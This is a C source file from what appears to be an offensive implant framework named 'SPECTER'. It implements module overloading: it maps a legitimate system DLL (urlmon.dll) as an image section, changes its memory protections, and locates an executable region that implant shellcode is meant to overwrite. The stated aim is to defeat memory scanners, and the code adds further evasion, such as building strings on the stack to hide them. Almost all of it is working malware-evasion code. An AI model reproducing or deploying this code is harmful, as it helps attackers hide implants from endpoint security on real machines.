/**
 * SPECTER Implant — Module Overloading via NtCreateSection
 *
 * Opens a benign system DLL (urlmon.dll), creates a SEC_IMAGE section
 * from it via NtCreateSection, and maps the section into the current
 * process.  The caller can then overwrite the mapped image with the
 * implant PIC blob, resulting in implant code backed by a legitimate
 * DLL on disk — defeating memory scanners that flag unbacked RX regions.
 *
 * All file/section operations go through the evasion-wrapped syscall
 * engine (evasion_syscall → indirect syscall with stack spoofing).
 */

#include "specter.h"
#include "ntdefs.h"
#include "syscalls.h"
#include "evasion.h"

#define IMAGE_DOS_SIGNATURE       0x5A4D
#define IMAGE_NT_SIGNATURE        0x00004550
#define IMAGE_SCN_MEM_EXECUTE     0x20000000

typedef struct _SPECTER_IMAGE_DOS_HEADER {
    WORD e_magic;
    WORD e_cblp;
    WORD e_cp;
    WORD e_crlc;
    WORD e_cparhdr;
    WORD e_minalloc;
    WORD e_maxalloc;
    WORD e_ss;
    WORD e_sp;
    WORD e_csum;
    WORD e_ip;
    WORD e_cs;
    WORD e_lfarlc;
    WORD e_ovno;
    WORD e_res[4];
    WORD e_oemid;
    WORD e_oeminfo;
    WORD e_res2[10];
    LONG e_lfanew;
} SPECTER_IMAGE_DOS_HEADER;

typedef struct _SPECTER_IMAGE_FILE_HEADER {
    WORD  Machine;
    WORD  NumberOfSections;
    DWORD TimeDateStamp;
    DWORD PointerToSymbolTable;
    DWORD NumberOfSymbols;
    WORD  SizeOfOptionalHeader;
    WORD  Characteristics;
} SPECTER_IMAGE_FILE_HEADER;

typedef struct _SPECTER_IMAGE_SECTION_HEADER {
    BYTE  Name[8];
    union {
        DWORD PhysicalAddress;
        DWORD VirtualSize;
    } Misc;
    DWORD VirtualAddress;
    DWORD SizeOfRawData;
    DWORD PointerToRawData;
    DWORD PointerToRelocations;
    DWORD PointerToLinenumbers;
    WORD  NumberOfRelocations;
    WORD  NumberOfLinenumbers;
    DWORD Characteristics;
} SPECTER_IMAGE_SECTION_HEADER;

/* ------------------------------------------------------------------ */
/*  evasion_module_overload                                             */
/* ------------------------------------------------------------------ */

NTSTATUS evasion_module_overload(EVASION_CONTEXT *ctx, PVOID *mapped_base,
                                  PSIZE_T mapped_size) {
    if (!ctx || !mapped_base || !mapped_size)
        return STATUS_INVALID_PARAMETER;

    *mapped_base = NULL;
    *mapped_size = 0;

    NTSTATUS status;
    HANDLE file_handle = NULL;
    HANDLE section_handle = NULL;

    /* ---- Step 1: Build NT path for urlmon.dll on the stack ---- */
    /* \??\C:\Windows\System32\urlmon.dll — built as char array to
       avoid string literals in .rdata */
    WCHAR dll_path[44];
    dll_path[0]  = '\\';
    dll_path[1]  = '?';
    dll_path[2]  = '?';
    dll_path[3]  = '\\';
    dll_path[4]  = 'C';
    dll_path[5]  = ':';
    dll_path[6]  = '\\';
    dll_path[7]  = 'W';
    dll_path[8]  = 'i';
    dll_path[9]  = 'n';
    dll_path[10] = 'd';
    dll_path[11] = 'o';
    dll_path[12] = 'w';
    dll_path[13] = 's';
    dll_path[14] = '\\';
    dll_path[15] = 'S';
    dll_path[16] = 'y';
    dll_path[17] = 's';
    dll_path[18] = 't';
    dll_path[19] = 'e';
    dll_path[20] = 'm';
    dll_path[21] = '3';
    dll_path[22] = '2';
    dll_path[23] = '\\';
    dll_path[24] = 'u';
    dll_path[25] = 'r';
    dll_path[26] = 'l';
    dll_path[27] = 'm';
    dll_path[28] = 'o';
    dll_path[29] = 'n';
    dll_path[30] = '.';
    dll_path[31] = 'd';
    dll_path[32] = 'l';
    dll_path[33] = 'l';
    dll_path[34] = '\0';

    UNICODE_STRING us_path;
    us_path.Buffer        = dll_path;
    us_path.Length        = 34 * sizeof(WCHAR);  /* 34 chars */
    us_path.MaximumLength = 35 * sizeof(WCHAR);

    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, &us_path, OBJ_CASE_INSENSITIVE, NULL, NULL);

    /* ---- Step 2: Open the sacrificial DLL via NtCreateFile ---- */
    IO_STATUS_BLOCK iosb;
    spec_memset(&iosb, 0, sizeof(iosb));

    status = spec_NtCreateFile(
        &file_handle,
        FILE_READ_DATA | FILE_READ_ATTRIBUTES | SYNCHRONIZE,
        &oa,
        &iosb,
        NULL,                           /* AllocationSize */
        0,                              /* FileAttributes */
        FILE_SHARE_READ,
        FILE_OPEN,
        FILE_SYNCHRONOUS_IO_NONALERT,
        NULL,                           /* EaBuffer */
        0                               /* EaLength */
    );

    if (!NT_SUCCESS(status))
        return status;

    /* ---- Step 3: Create SEC_IMAGE section from the DLL ---- */
    status = spec_NtCreateSection(
        &section_handle,
        SECTION_ALL_ACCESS,
        NULL,                           /* ObjectAttributes */
        NULL,                           /* MaximumSize (whole file) */
        PAGE_READONLY,
        SEC_IMAGE,
        file_handle
    );

    /* Close file handle — no longer needed after section creation */
    spec_NtClose(file_handle);
    file_handle = NULL;

    if (!NT_SUCCESS(status))
        return status;

    /* ---- Step 4: Map the section into our process ---- */
    PVOID   view_base = NULL;
    SIZE_T  view_size  = 0;
    HANDLE  current_process = (HANDLE)(ULONG_PTR)-1;

    status = spec_NtMapViewOfSection(
        section_handle,
        current_process,
        &view_base,
        0,                              /* ZeroBits */
        0,                              /* CommitSize */
        NULL,                           /* SectionOffset */
        &view_size,
        ViewShare,
        0,                              /* AllocationType */
        PAGE_READWRITE
    );

    /* Close section handle regardless of map result */
    spec_NtClose(section_handle);

    if (!NT_SUCCESS(status))
        return status;

    /* SEC_IMAGE views keep their original section protections. Make the
       sacrificial view writable before copying the PIC bytes into it. */
    PVOID protect_base = view_base;
    SIZE_T protect_size = view_size;
    DWORD old_protect = 0;
    status = spec_NtProtectVirtualMemory(
        current_process,
        &protect_base,
        &protect_size,
        PAGE_EXECUTE_READWRITE,
        &old_protect
    );
    if (!NT_SUCCESS(status))
        return status;

    /* ---- Step 5: Return mapped region to caller ---- */
    *mapped_base = view_base;
    *mapped_size = view_size;

    return STATUS_SUCCESS;
}

/* ------------------------------------------------------------------ */
/*  evasion_module_overload_finalize — flip RW → RX after PIC copy      */
/* ------------------------------------------------------------------ */

NTSTATUS evasion_module_overload_find_exec_range(PVOID mapped_base,
                                                 SIZE_T mapped_size,
                                                 SIZE_T payload_size,
                                                 PVOID *exec_base,
                                                 PSIZE_T exec_size) {
    if (!mapped_base || !exec_base || !exec_size || payload_size == 0)
        return STATUS_INVALID_PARAMETER;

    *exec_base = NULL;
    *exec_size = 0;

    if (mapped_size < 0x1000)
        return STATUS_NOT_FOUND;

    BYTE *base = (BYTE *)mapped_base;
    SPECTER_IMAGE_DOS_HEADER *dos = (SPECTER_IMAGE_DOS_HEADER *)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE ||
        dos->e_lfanew <= 0 ||
        (SIZE_T)dos->e_lfanew + 0x18 >= mapped_size)
        return STATUS_NOT_FOUND;

    BYTE *nt = base + dos->e_lfanew;
    if (*(DWORD *)nt != IMAGE_NT_SIGNATURE)
        return STATUS_NOT_FOUND;

    SPECTER_IMAGE_FILE_HEADER *fh =
        (SPECTER_IMAGE_FILE_HEADER *)(nt + sizeof(DWORD));
    if (fh->NumberOfSections == 0 || fh->NumberOfSections > 96)
        return STATUS_NOT_FOUND;

    SPECTER_IMAGE_SECTION_HEADER *sec =
        (SPECTER_IMAGE_SECTION_HEADER *)((BYTE *)fh +
                                         sizeof(SPECTER_IMAGE_FILE_HEADER) +
                                         fh->SizeOfOptionalHeader);
    if ((BYTE *)sec < base ||
        (SIZE_T)((BYTE *)sec - base) +
            ((SIZE_T)fh->NumberOfSections * sizeof(SPECTER_IMAGE_SECTION_HEADER)) >
                mapped_size)
        return STATUS_NOT_FOUND;

    for (WORD i = 0; i < fh->NumberOfSections; i++) {
        DWORD va;
        DWORD vsz;

        if (!(sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE))
            continue;

        va = sec[i].VirtualAddress;
        vsz = sec[i].Misc.VirtualSize;
        if (vsz == 0)
            vsz = sec[i].SizeOfRawData;
        if (va == 0 || vsz == 0)
            continue;
        if ((SIZE_T)va >= mapped_size || (SIZE_T)va + (SIZE_T)vsz > mapped_size)
            continue;
        if ((SIZE_T)vsz < payload_size)
            continue;

        *exec_base = base + va;
        *exec_size = (SIZE_T)vsz;
        return STATUS_SUCCESS;
    }

    return STATUS_NOT_FOUND;
}

NTSTATUS evasion_module_overload_finalize(EVASION_CONTEXT *ctx, PVOID base, SIZE_T size) {
    (void)ctx;
    DWORD old_protect;
    SIZE_T region_size = size;
    PVOID region_base = base;
    return spec_NtProtectVirtualMemory((HANDLE)-1, &region_base, &region_size,
                                        PAGE_EXECUTE_READ, &old_protect);
}

NTSTATUS evasion_module_overload_finalize_split(EVASION_CONTEXT *ctx,
                                                PVOID base,
                                                SIZE_T mapped_size,
                                                SIZE_T payload_size,
                                                SIZE_T rw_offset) {
    (void)ctx;
    if (!base || mapped_size == 0 || payload_size == 0 ||
        rw_offset == 0 || rw_offset >= payload_size)
        return STATUS_INVALID_PARAMETER;

    if (payload_size > mapped_size)
        payload_size = mapped_size;

    SIZE_T payload_end = (payload_size + 0xFFF) & ~(SIZE_T)0xFFF;
    if (payload_end > mapped_size)
        payload_end = mapped_size;

    DWORD old_protect = 0;
    PVOID code_base = base;
    SIZE_T code_size = rw_offset;
    NTSTATUS status = spec_NtProtectVirtualMemory(
        (HANDLE)-1,
        &code_base,
        &code_size,
        PAGE_EXECUTE_READ,
        &old_protect
    );
    if (!NT_SUCCESS(status))
        return status;

    PVOID data_base = (PVOID)((BYTE *)base + rw_offset);
    SIZE_T data_size = payload_end - rw_offset;
    status = spec_NtProtectVirtualMemory(
        (HANDLE)-1,
        &data_base,
        &data_size,
        PAGE_READWRITE,
        &old_protect
    );
    if (!NT_SUCCESS(status))
        return status;

    if (payload_end < mapped_size) {
        PVOID rest_base = (PVOID)((BYTE *)base + payload_end);
        SIZE_T rest_size = mapped_size - payload_end;
        status = spec_NtProtectVirtualMemory(
            (HANDLE)-1,
            &rest_base,
            &rest_size,
            PAGE_READONLY,
            &old_protect
        );
    }

    return status;
}
